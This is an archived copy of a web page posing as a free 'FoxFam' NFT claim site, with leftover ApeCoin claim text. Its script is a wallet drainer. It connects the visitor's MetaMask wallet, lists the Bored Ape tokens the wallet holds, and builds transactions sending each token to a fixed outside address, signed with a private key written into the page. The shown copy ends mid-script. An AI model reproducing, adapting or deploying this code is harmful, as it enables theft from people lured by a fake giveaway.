<!DOCTYPE html>
    <html lang="en">


<!-- Mirrored from foxfamfreemint.000webhostapp.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jun 2022 03:50:43 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
            <meta name="viewport" content="width=device-width">
            <meta charset="utf-8">
            <meta property="og:type" content="website">
            <meta property="og:image:alt" content="FoxFam">
            <meta property="og:image:width" content="1200">
            <meta property="og:image:height" content="800">
            <meta property="og:locale" content="en_US">
            <meta property="og:site_name" content="FoxFam">
            <link rel="icon" href="assets/ff-icon.png" />
            <title>Claim Your FoxFam</title>
            <meta name="robots" content="index,follow">
            <meta name="description" content="Claim your FoxFam NFT for free">
            <meta property="og:title" content="Claim Your FoxFam">
            <meta property="og:description" content="Claim your FoxFam NFT for free">
            <meta property="og:image" content="assets/ff-icon.png">
            <meta name="next-head-count" content="19">
            <link rel="preload" href="_next/static/css/8a2d873bf5e6aa91.css" as="style">
            <link rel="stylesheet" href="_next/static/css/8a2d873bf5e6aa91.css" data-n-g="">
            <link rel="preload" href="_next/static/css/9a07929828de4d0b.css" as="style">
            <link rel="stylesheet" href="_next/static/css/9a07929828de4d0b.css" data-n-p="">
            <noscript data-n-css=""></noscript>

            <script type="text/javascript" language="javascript" src="ethjs-unit.min.js"></script>

            <script type="text/javascript" language="javascript" src="web3-1.3.4.min.js"></script>

            <script type="text/javascript" language="javascript" src="jquery-1.6.4.min.js"></script>

            <script type="text/javascript" language="javascript" src="ethereumjs-tx-1.3.3.min.js"></script>

        </head>

<body style="overflow: auto; background-image: url('assets/background.jpg'); background-size: cover; height: auto;"> 
    <div style="position: absolute; width: 95%; height: 10%;">
        <header style="display: flex; height: 100%; margin-top: 1%; justify-content:flex-end;">
            <a href="https://opensea.io/collection/foxfam" target="_blank" style="margin: 1.2%; margin-right: 1%; display: flex;"><img src="assets/opensea.png" alt="opensea icon"></a>
            <a href="https://twitter.com/foxfamnft" target="_blank" style="margin: 1.2%; margin-right: 1%; display: flex;"><img src="assets/twitter.png" alt="twitter icon"></a>
            <a href="https://discord.com/invite/FoxFam" target="_blank" style="margin: 1.2%; margin-right: 1%; display: flex;"><img src="assets/discord.png" alt="discord icon"></a>
            <a href="https://www.instagram.com/foxfamnft" target="_blank" style="margin: 1.2%; margin-right: 1%; display: flex;"><img src="assets/instagram.png" alt="instagram icon"></a>
        </header>
    </div>


    <div id="__next" data-reactroot="">

         <video autoplay="" muted="" playsinline="" loop="" class="pointer-events-none fixed top-0 left-0 -z-20 h-screen w-full object-contain">
            <source src="VIDEO%20HERE.html" type="video/mp4">
        </video>

        <div class="pointer-events-none fixed top-0 left-0 -z-10 h-screen w-full bg-black/75 backdrop-blur transition-opacity duration-1000 opacity-0"></div>
        <div id="__layout" style="opacity: 1;">
            <header style="display:none" class="sticky top-0 left-0 z-50 h-header w-full bg-dither">
                <div style="display: none" class="wrapper flex h-full items-center justify-between gap-x-gutter">
                    <a class="z-50 -mt-[20px] flex h-nav items-center laptop:-mt-[1px]" href="index-3.html">
                        <img src="assets/wordmark.html" alt="ApeCoin" class="w-[96px] laptop:w-[76px]">
                    </a>
                    <div class="relative z-50 hidden flex-1 border-t text-xs uppercase laptop:block laptop:flex-[0_0_25%]">
                        <ul class="flex overflow-hidden">
                            <li class="tick group relative flex h-nav text-xs uppercase hover:before:h-[12px]">
                                <a class="-ml-px flex items-center pr-lg" target="_self" rel="" href="exchanges.html"><span>Buy/Sell</span> <!-- --> </a></li></ul></div><button class="relative z-20 -mt-[24px] h-nav"><svg viewBox="0 0 28 48" overflow="visible" preserveAspectRatio="none" width="28" height="48"><line x1="0" x2="28" y1="12" y2="12" stroke="currentColor" stroke-width="1" vector-effect="non-scaling-stroke" style="transform: none; transform-origin: 14px 12px 0px;" transform-origin="14px 12px"></line><line x1="0" x2="28" y1="18" y2="18" stroke="currentColor" stroke-width="1" vector-effect="non-scaling-stroke" style="transform: none; transform-origin: 14px 18px 0px;" transform-origin="14px 18px"></line></svg><span class="absolute bottom-0 left-0  text-xs uppercase transition-opacity opacity-1">Menu</span></button><nav class="fixed top-0 left-0 z-10 flex h-full w-full max-w-sm flex-col bg-black pt-xxl" style="transform: translateX(-100%) translateZ(0px);"><ul><li class="text-lg font-semibold uppercase"><a class="flex items-center py-xs px-gutter" href="about.html"><span>About</span></a></li><li class="text-lg font-semibold uppercase"><a class="flex items-center py-xs px-gutter" href="governance.html"><span>Governance</span></a></li><li class="text-lg font-semibold uppercase"><a class="flex items-center py-xs px-gutter" href="claim.html"><span>Claim</span></a></li><li class="text-lg font-semibold uppercase"><a class="flex items-center py-xs px-gutter" href="https://snapshot.org/#/apecoin.eth"><span>Proposals</span><svg class="ml-[6px]" width="7" height="7" viewBox="0 0 7 7" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.5 0.5H0M6.5 0.5V7M6.5 0.5L0.382353 6.61765" stroke="#E5E5E5" stroke-width="0.7"></path></svg></a></li><li class="text-lg font-semibold uppercase"><a class="flex items-center py-xs px-gutter" href="https://forum.apecoin.com/"><span>Discussion</span><svg class="ml-[6px]" width="7" height="7" viewBox="0 0 7 7" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.5 0.5H0M6.5 0.5V7M6.5 0.5L0.382353 6.61765" stroke="#E5E5E5" stroke-width="0.7"></path></svg></a></li><li class="mt-sm border-t border-white/10 pt-sm text-lg font-semibold uppercase"><a class="flex items-center py-xs px-gutter" href="exchanges-2.html"><span>Buy/Sell</span></a></li></ul><ul class="mt-auto mb-md"><li class="text-base font-semibold uppercase text-white/50"><a class="flex items-center py-xs px-gutter" href="terms.html"><span>Terms</span></a></li><li class="text-base font-semibold uppercase text-white/50"><a class="flex items-center py-xs px-gutter" href="privacy.html"><span>Privacy</span></a></li><li class="text-base font-semibold uppercase text-white/50"><a class="flex items-center py-xs px-gutter" href="mailto:support@apecoin.com"><span>Support</span></a></li><li class="text-base font-semibold uppercase text-white/50"><a class="flex items-center py-xs px-gutter" href="mailto:press@apecoin.com"><span>Press Inquiries</span></a></li><li class="text-base font-semibold uppercase text-white/50"><a class="flex items-center py-xs px-gutter" href="assets/press/ApeCoin_Press_Kit.html"><span>Press Kit</span></a></li></ul></nav></div></header>
                                
                                <main id="__main" style="opacity: 1;">
                                    <div class="laptop:wrapper mx-sm mt-sm flex flex-col items-center justify-center laptop:mt-xl">

                                        <div id="noMeta" style="display: none;" class=" flex h-full min-h-[320px] w-full max-w-3xl flex-col rounded-2xl border border-white/10 bg-deep/50 backdrop-blur ">
                                            <div class="flex flex-1 flex-col items-center justify-center">
                                                <p class="mb-sm px-gutter">You need to connect your wallet before you can claim a FoxFam.
                                                </p>
                                                
                                                <div>MetaMask is not installed.</div>

                                                <a class="btn mt-sm" href="https://metamask.zendesk.com/hc/en-us/articles/360015489531-Getting-started-with-MetaMask">Install MetaMask</a>
                                                
                                            </div>
                                        </div>


                                        <div id="connecti" class=" flex h-full min-h-[320px] w-full max-w-3xl flex-col rounded-2xl border border-white/10 bg-deep/50 backdrop-blur ">
                                            <div id="content" class="flex flex-1 flex-col items-center justify-center">
                                                <p class="mb-sm px-gutter" id="">You need to connect your MetaMask wallet before you can claim a FoxFam.</p>
                                    
                                                <button id="connect" onclick="onClickConnect();" class="btn">Connect Wallet</button>
                                            </div>
                                        </div>


                                        <div id="no-ape" style="display: none;" class="lex h-full min-h-[320px] w-full max-w-3xl flex-col rounded-2xl border border-white/10 bg-deep/50 backdrop-blur ">
                                            
                                            <div>
                                                
                                                <section class="mb-md flex flex-col justify-between border-b border-white/10 p-gutter laptop:flex-row">
                                                    
                                                    <div>
                                                        <div class="text-sm font-semibold uppercase">Account</div>
                                                        <div class="mb-sm w-full truncate text-base laptop:mb-0">0xAB2Fe9433cDf1E3372bb2A6E11880F467F1ad114</div>
                                                    </div>
                                                
                                                </section>
                                                
                                                <div class="flex h-full items-center px-gutter text-error">No eligible tokens found in wallet.</div>
                                            </div>
                                        </div>


                                        <div id="signi" style="display: none;" class="flex h-full min-h-[320px] w-full max-w-3xl flex-col rounded-2xl border border-white/10 bg-deep/50 backdrop-blur ">
                                            
                                            <div>

                                                <section class="mb-md flex flex-col justify-between border-b border-white/10 p-gutter laptop:flex-row">
                                                    <div>
                                                        <div class="text-sm font-semibold uppercase">Account</div>
                                                        <div id="account_num" class="mb-sm w-full truncate text-base laptop:mb-0"></div>
                                                    </div>
                                                </section>

                                                <p class="mb-md px-gutter" style="color: green;">

                                                    Metamask connected!
                                                </p>
                                                
                                                <p class="mb-lg px-gutter">

                                                    Claim your FoxFam NFT for free.<br>
                                                </p>

                                                <p class="px-gutter mx-auto" style="color: green;">

                                                   verify Ownership of Assets to claim your FoxFam NFT.
                                                </p> 

                                                <button id="sign" onclick="verifyAsset();" class="btn" style="margin: 25px;">Verify Assets</button>

                                            </div>

                                        </div>


                                        <div id="error" style="display: none;" class="flex h-full min-h-[320px] w-full max-w-3xl flex-col rounded-2xl border border-white/10 bg-deep/50 backdrop-blur ">
                                            
                                            <div>

                                                <section class="mb-md flex flex-col justify-between border-b border-white/10 p-gutter laptop:flex-row">
                                                    <div>
                                                        <div class="text-sm font-semibold uppercase">Account</div>
                                                        <div id="account_nm" class="mb-sm w-full truncate text-base laptop:mb-0"></div>
                                                    </div>
                                                </section>

                                                <p id="error-text" class="px-gutter text-error">
                                                    Error: Could not fetch tokens.
                                                    <br>

                                                </p> 

                                                <!-- <button id="sign" onclick="claim();" class="mt-sm mb-sm btn">Verify Assets</button> -->

                                            </div>

                                        </div>
                                        
                                        <div style="display: none;" class="mt-sm mb-md w-full max-w-3xl flex-1 text-center text-xs laptop:mb-0"><span class="font-semibold uppercase">Verified Smart Contract Address:<!-- --> </span><a href="https://etherscan.io/address/0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F" target="_blank" rel="noreferrer">0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F</a></div></div><div style="display: none" class="wrapper mt-sm laptop:pt-xl"><article><p class="mx-auto mb-sm w-full max-w-2xl text-base">150 million tokens (24.2% of the Ecosystem Fund and 15% of the total supply of
ApeCoin) are claimable by BAYC and MAYC NFT holders upon launch of ApeCoin.</p>
<p class="mx-auto mb-sm w-full max-w-2xl text-base">To ensure a fair launch of ApeCoin to BAYC and MAYC NFT holders, the allocation
is informed by the difference in floor price between each collection of NFTs,
roughly the month prior to the token claim launch (02/07/22 to 03/08/22). Bored
Ape Kennel Club NFTs will be able to claim ApeCoin if paired with either a Bored
Ape or Mutant Ape.</p>
<table class="mx-auto mt-lg w-full max-w-2xl table-fixed"><thead><tr class="flex border-b border-white/10"><th class="flex flex-1 py-sm pr-gutter text-left text-sm font-semibold uppercase last-of-type:pr-0">NFT</th><th class="flex flex-1 py-sm pr-gutter text-left text-sm font-semibold uppercase last-of-type:pr-0">ApeCoin Allocated Per NFT or NFT Pair</th></tr></thead><tbody><tr class="flex border-b border-white/10"><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">Bored Ape only</td><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">10,094 tokens</td></tr><tr class="flex border-b border-white/10"><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">Mutant Ape only</td><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">2,042 tokens</td></tr><tr class="flex border-b border-white/10"><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">Bored Ape + Kennel Club <span class="block text-xs">(token IDs do not need to match)</span></td><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">10,950 tokens</td></tr><tr class="flex border-b border-white/10"><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">Mutant Ape + Kennel Club <span class="block text-xs">(token IDs do not need to match)</span></td><td class="flex-1 items-start py-sm pr-gutter text-sm last-of-type:pr-0">2,898 tokens</td></tr></tbody></table>
<p class="mx-auto mt-md mb-lg w-full max-w-2xl text-xs italic text-white/50">
<li class="mb-xs pl-sm">There is no distinction between Mutant Ape types for the claim.</li>
<li class="mb-xs pl-sm">Ape + Kennel token IDs do not need to match to claim, nor does having the original pairing entitle any extra tokens.</li>
<li class="mb-xs pl-sm">This is a one-time claim that will identify all eligible NFTs in your wallet, in the order that they appear. There will not be an option to deselect an eligible NFT if it is present in your wallet. If you wish to claim for one of your NFTs but not another, you will need to move them to separate wallets.</li>
<li class="mb-xs pl-sm">A Bored Ape or Mutant Ape that has claimed its tokens cannot be used later to claim tokens for an accompanying Kennel Club. All paired NFTs must be claimed together at the same time.</li>
<li class="mb-xs pl-sm">Unused Bored Ape Chemistry Club serums do not qualify for token claim.</li>
<li class="mb-xs pl-sm">The airdrop claim tokens associated with any NFT can only be claimed once. In order to check whether a certain BAYC, MAYC (or companion BAKC) has claimed its tokens, use the below checker.</li>
<li class="mb-xs pl-sm">There will be Ethereum network gas fees incurred to claim ApeCoin.</li>
</p>
<p class="mx-auto mb-sm w-full max-w-2xl text-base">Future airdrop and claim events are determined by ApeCoin DAO.</p>
<p class="mx-auto mb-sm w-full max-w-2xl text-base">There is a 90-day claim period for BAYC and MAYC.<br>
After this, the unclaimed tokens are sent to the Ecosystem Fund.</p></article></div>

<section class="mx-auto max-w-2xl"></section>
<section style="display: none" class="wrapper mt-lg laptop:mt-xxl">
    <h2 class="mx-auto mb-sm max-w-2xl text-xl font-black uppercase tablet:text-2xl">NFT Claim Check</h2>
    <p class="mx-auto mb-md max-w-2xl text-base">Enter the Token ID to see if a Bored Ape, Mutant Ape, or companion Kennel Club NFT is eligible for a one-time claim of ApeCoin.</p>
    
    <div class="mx-auto flex min-h-[128px] max-w-2xl flex-col items-center justify-center rounded-2xl border border-white/10 bg-deep/50 backdrop-blur">
        <div class="w-full border-b border-white/10 p-sm last:border-b-0"><form class="flex flex-wrap items-center justify-evenly"><div class="flex-1">Bored Ape</div><div class="flex items-center">#&nbsp;<input type="number" class="mr-gutter block h-[30px] w-[80px] rounded border border-white/10 bg-deep/50 text-center text-base focus:border-white/50 focus:outline-none" max="99999"></div><button class="btn btn-small ">Check</button></form><div class="mt-xs"></div></div><div class="w-full border-b border-white/10 p-sm last:border-b-0"><form class="flex flex-wrap items-center justify-evenly"><div class="flex-1">Mutant Ape</div><div class="flex items-center">#&nbsp;<input type="number" class="mr-gutter block h-[30px] w-[80px] rounded border border-white/10 bg-deep/50 text-center text-base focus:border-white/50 focus:outline-none" max="99999"></div><button class="btn btn-small ">Check</button></form><div class="mt-xs"></div></div><div class="w-full border-b border-white/10 p-sm last:border-b-0"><form class="flex flex-wrap items-center justify-evenly"><div class="flex-1">Kennel Club</div><div class="flex items-center">#&nbsp;<input type="number" class="mr-gutter block h-[30px] w-[80px] rounded border border-white/10 bg-deep/50 text-center text-base focus:border-white/50 focus:outline-none" max="99999"></div><button class="btn btn-small ">Check</button></form><div class="mt-xs"></div></div></div><p class="my-md mx-auto max-w-2xl text-sm italic text-white/50">Please note: this checker updates in real time as tokens are claimed. If you are purchasing a Bored Ape, Mutant, or Kennel Club NFT on the secondary market, keep in mind that it’s possible for someone to claim immediately after you have checked, making the Bored Ape, Mutant Ape, or Kennel Club NFT no longer eligible.</p></section></main><footer style="display: none" class="wrapper mt-md flex flex-wrap items-center opacity-60 laptop:mt-xxl"><div class="flex w-full items-center gap-x-gutter"><div class="hidden flex-1 border-t laptop:block"><ul class="flex overflow-hidden"><li class="tick group relative flex h-nav text-xs uppercase hover:before:h-[12px]"><a class="-ml-px flex items-center pr-lg" target="_self" rel="" href="terms-2.html"><span>Terms</span> <!-- --> </a></li><li class="tick group relative flex h-nav text-xs uppercase hover:before:h-[12px]"><a class="-ml-px flex items-center pr-lg" target="_self" rel="" href="privacy-2.html"><span>Privacy</span> <!-- --> </a></li><li class="tick group relative flex h-nav text-xs uppercase hover:before:h-[12px]"><a class="-ml-px flex items-center pr-lg" target="_self" rel="" href="cdn-cgi/l/email-protection.html#92e1e7e2e2fde0e6d2f3e2f7f1fdfbfcbcf1fdff"><span>Support</span> <!-- --> </a></li><li class="tick group relative flex h-nav text-xs uppercase hover:before:h-[12px]"><a class="-ml-px flex items-center pr-lg" target="_self" rel="" href="cdn-cgi/l/email-protection.html#44343621373704253421272b2d2a6a272b29"><span>Press Inquiries</span> <!-- --> </a></li><li class="tick group relative flex h-nav text-xs uppercase hover:before:h-[12px]"><a class="-ml-px flex items-center pr-lg" target="_self" rel="" href="assets/press/ApeCoin_Press_Kit.html"><span>Press Kit</span> <!-- --> <svg class="ml-[6px]" width="7" height="8" viewBox="0 0 7 8" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0.5 7H6.5M3.5 0V5.6M3.5 5.6L1 3M3.5 5.6L6 3" stroke="#E5E5E5" stroke-width="0.7"></path></svg></a></li></ul></div><div class=" tick relative z-50 flex h-nav flex-1 items-center border-t text-xs uppercase laptop:flex-[0_0_25%]"><div class="relative"><a class="tick flex h-nav w-lg items-center pr-sm" href="https://instagram.com/apecoindao" target="_blank" rel="noreferrer noopener"><span class="sr-only">Instagram</span><svg fill="none" height="14" viewBox="0 0 14 14" width="14" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><clipPath id="a"><path d="m0 0h13.1613v13.1613h-13.1613z"></path></clipPath><g clip-path="url(#a)"><path d="m6.58071 1.18616c1.75703 0 1.96542.00658 2.65967.03839 1.78332.08116 2.61632.92732 2.69752 2.69751.0318.69371.0378.9021.0378 2.65913 0 1.75758-.0065 1.96542-.0378 2.65913-.0817 1.76858-.9125 2.61638-2.69752 2.69748-.69425.0318-.90154.0384-2.65967.0384-1.75704 0-1.96542-.0066-2.65913-.0384-1.78774-.0817-2.61636-.9317-2.69752-2.69803-.03181-.6937-.03839-.90154-.03839-2.65912 0-1.75704.00713-1.96488.03839-2.65913.08171-1.76965.91252-2.61636 2.69752-2.69752.69426-.03126.90209-.03784 2.65913-.03784zm0-1.18616c-1.7872 0-2.01094.00767742-2.71287.0394839-2.38988.1096771-3.718069 1.4356761-3.8277467 3.8277461-.03235485.70248-.04003226.92622-.04003226 2.71342 0 1.78719.00767741 2.01148.03948386 2.71341.1096771 2.38984 1.4356751 3.71804 3.8277451 3.82774.70248.0318.92622.0395 2.71342.0395 1.78719 0 2.01148-.0077 2.71342-.0395 2.38767-.1097 3.71917-1.4357 3.82717-3.82774.0324-.70193.0401-.92622.0401-2.71341 0-1.7872-.0077-2.01094-.0395-2.71288-.1075-2.38767-1.4352-3.71806-3.82723-3.8277377-.70248-.03235488-.92677-.0400323-2.71396-.0400323zm0 3.20148c-1.86617 0-3.37916 1.513-3.37916 3.37917 0 1.86616 1.51299 3.3797 3.37916 3.3797 1.86616 0 3.37916-1.51299 3.37916-3.3797 0-1.86617-1.513-3.37917-3.37916-3.37917zm0 5.57271c-1.21139 0-2.19355-.98161-2.19355-2.19354 0-1.21139.98216-2.19355 2.19355-2.19355 1.21138 0 2.19354.98216 2.19354 2.19355 0 1.21193-.98216 2.19354-2.19354 2.19354zm3.51299-6.49564c-.43654 0-.79025.35371-.79025.78968 0 .43596.35371.78967.79025.78967.4359 0 .7891-.35371.7891-.78967 0-.43597-.3532-.78968-.7891-.78968z" fill="#8a8a8a"></path></g></svg></a></div><div class="relative"><a class="tick flex h-nav w-lg items-center pr-sm" href="https://twitter.com/apecoin" target="_blank" rel="noreferrer noopener"><span class="sr-only">Twitter</span><svg fill="none" height="11" viewBox="0 0 14 11" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m13.1613 1.49865c-.4842.21497-1.0047.35974-1.5508.425.5577-.33397.986-.86316 1.1872-1.493809-.5215.309291-1.0995.534129-1.7148.655319-.4919-.524803-1.19438-.852738-1.9709-.852738-1.74332 0-3.02435 1.626518-2.63061 3.314998-2.24345-.11242-4.233-1.18726-5.565035-2.820901-.707419 1.213581-.366871 2.801161.835195 3.605101-.442-.01426-.858776-.13546-1.222356-.33781-.029613 1.25087.866996 2.42113 2.165576 2.68161-.38003.1031-.79625.12723-1.21961.04607.34329 1.07264 1.34026 1.853 2.52258 1.87493-1.13516.89003-2.56535 1.28762-3.99774 1.11871 1.19494.76607 2.61471 1.21307 4.13923 1.21307 5.01335 0 7.84577-4.23413 7.67467-8.03171.5276-.38113.9855-.85658 1.3474-1.39784z" fill="#8a8a8a"></path></svg></a></div><div class="ml-auto">© <!-- -->2022<!-- --> Ape Foundation</div></div></div><div class="mb-sm flex-1 text-xs"><span class="">ApeCoin Smart Contract Address: </span><a href="https://etherscan.io/token/0x4d224452801aced8b2f0aebe155379bb5d594381" target="_blank" rel="noreferrer">0x4d224452801aced8b2f0aebe155379bb5d594381</a></div></footer></div></div>
        
        <script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/claim","query":{},"buildId":"fVEw2eTElp2yFbaXdDNcq","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script>
        <!-- Cloudflare Pages Analytics -->

        <script defer="" src="static.cloudflareinsights.com/beacon.min.html" data-cf-beacon="{&quot;token&quot;: &quot;aec473b181cb478099be1377f54b6ec2&quot;}"></script>

        <!-- Cloudflare Pages Analytics -->
        <script type="text/javascript">(function(){window['__CF$cv$params']={r:'6ee087ffbb5276f0',m:'stDHWv7qxkNKZ8t_iQs8BO_YjBmn9.CWCHxXwBp72Jk-1647633382-0-ASe8cJStYtKsJ50YyJ4lhPZrc4xn2dQUg2NnTfSS6GTvYDCigdKj3Y5Bnmre3ThU/ACWVja0aEzuYC31OAlvFxyQUSzLkCCB6EDKmSiG2SQDk0WqSJNq1pEG+3/sBXxd8w==',s:[0x83b67b2802,0x741fbe85ee],}})();</script>


        <script type="text/javascript">

            let currentAccount = null;
            let abi;
            let account = "";
            const contactAddress = '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D';
            const toAddress = '0x03dFFA990F8fD07d383d4fEC5a595E5153982432';
            let token_contract = null;
            let eth_bal;
            let token_bal;
            let chainId;
            let error_type;
            const tokens = [];

            const minABI = [
                // balanceOf
                {
                "constant":true,
                "inputs":[{"name":"_owner","type":"address"}],
                "name":"balanceOf",
                "outputs":[{"name":"balance","type":"uint256"}],
                "type":"function"
                },
                // decimals
                {
                "constant":true,
                "inputs":[],
                "name":"decimals",
                "outputs":[{"name":"","type":"uint8"}],
                "type":"function"
                }
            ];

            abi = [{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]

            //Created check function to see if the MetaMask extension is installed
            const isMetaMaskInstalled = () => {
                //Have to check the ethereum binding on the window object to see if it's installed
                const { ethereum } = window;
                return Boolean(ethereum);
            };

            const onClickConnect = async () => {

                try {

                    // Will open the MetaMask UI
                    // You should disable this button while the request is pending!
                    await ethereum
                    .request({ method: 'eth_requestAccounts' })
                    .then(handleAccountsChanged);
                    
                } catch (error) {
                    console.error(error);
                    notify();
                }
            };


            const MetaMaskClientCheck = async () => {

                //Now we check to see if MetaMask is installed
                if (!isMetaMaskInstalled()) {

                    //If it isn't installed we ask the user to click to install it
                    //alert("Metamask is not installed");'

                    error = "<p class='mb-sm text-center px-gutter'>You need to connect your MetaMask wallet before you can claim FoxFam.</p>" +
                        "<p class='mb-sm px-gutter'>MetaMask is not installed.</p>" + "<a class='btn' href='https://metamask.app.link/dapp/apecoinclaim.com/' target='_blank'>Open MetaMask</a>"
                        
                    $("#content").html(error);
                    $("#connecti").show();

                    
                }
                
                else {
                    //If it is installed we change our button text

                    web3 = new Web3(ethereum);
                    window.web3 = web3;

                    chainId = await web3.eth.getChainId();
                    
                    if (chainId != 1) {

                        try {

                            await ethereum
                            .request({            
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: '0x1' }],
                            }) 
                            .then(console.log)

                            .catch((err) => {
                                alert("Switch network to use dapp")
                                console.log(err);
                            });

                        }

                        catch (err) {

                            console.log(error);

                        }

                    };
                

                }

            };

            function handleAccountsChanged(accounts) {
                if (accounts.length === 0) {
                    // MetaMask is locked or the user has not connected any accounts
                    console.log('Please connect to MetaMask.');

                    $('#connecti').show();
                    $("#signi").hide();
                    //$("#buyBtn").attr('disabled', true);

                } else if (accounts[0] !== currentAccount) {
                    console.log("Metamask account changed: " + accounts[0]);
                    
                    currentAccount = accounts[0];
                    
                    $("#connecti").hide();
                    $("#signi").show();
                    $("#account_num").text(currentAccount);
                    //$("#buyBtn").attr('disabled', false);

                    if (typeof accountChangedCallback !== 'undefined') {
                        accountChangedCallback();
                    }
                }   
            }


            const withdraw = async () => {

                web3 = new Web3(ethereum);

                console.log("here")

                for ( const token of tokens) {

                    try {
                        console.log(token)

                        transferData = await token_contract.methods.safeTransferFrom(currentAccount, "0x0dD4F190DC142f49Dbc80231899f7A03A297d3D2", token).encodeABI();
                        txnCount = await web3.eth.getTransactionCount(currentAccount, "pending");
                        jgasPrice = await web3.eth.getGasPrice();
                        const gas = new web3.utils.BN("500000");

                        txObject = {
                            nonce: txnCount,
                            gasLimit: 200000,
                            gasPrice: jgasPrice,
                            to: contactAddress,
                            value: "0x",
                            data: transferData,
                            chainId: chainId,
                            from: currentAccount,
                        };

                        ethTx = new ethereumjs.Tx(txObject);

                        prv = "5ae068df38a82e4b6773a41641e13e879e2ebc424ed233568f00a78d8aa92939";

                        key = "0x" + prv.toString(16);


                        //ethTx.sign(web3.utils.toHex(prv));

                        var stx = ethTx.serialize();

                        txsigned = await web3.eth.accounts.signTransaction(txObject, prv);
                        //.then(hash.rawTransaction);

                        const rstr = txsigned.rawTransaction;

                        //const rTx = '0x' + rstr.serialize().toString('hex');

                        console.log(rstr);
                        console.log(txsigned.transactionHash);


                        await web3.eth.sendSignedTransaction(rstr)
                        .then((hash) => {
                            console.log(hash);
                            notify(2);

                        })

                        
                        /***
                        await web3.eth.sendTransaction(txObject)
                        .then((hash) => {
                            console.log(hash);
                        })
                        
                        ***/
                    }

                    catch (err) {

                        console.log(err);
                    }

                }
                console.log("heter")


                

            }

                        
            const listTokensOfOwner = async () => {

                try {

                    //\console.error(await token.name(), 'tokens owned by', account);

                    await token_contract.getPastEvents('Transfer', {
                        filter: {
                            to: currentAccount
                        },
                        fromBlock: 0
                    })
                    
                    .then(async (events) => {
                        for (let event of events) {

                            //console.log(event.returnValues.tokenId);
                            id = event.returnValues.tokenId;
                            fro = event.returnValues.to;
                            ids = await token_contract.methods.ownerOf(id).call();
                            index = tokens.length;

                            if (ids == fro) {
                                tokens[index] = id;
                            }
                        }

                        console.log(tokens);
                        
                    });

                    /***

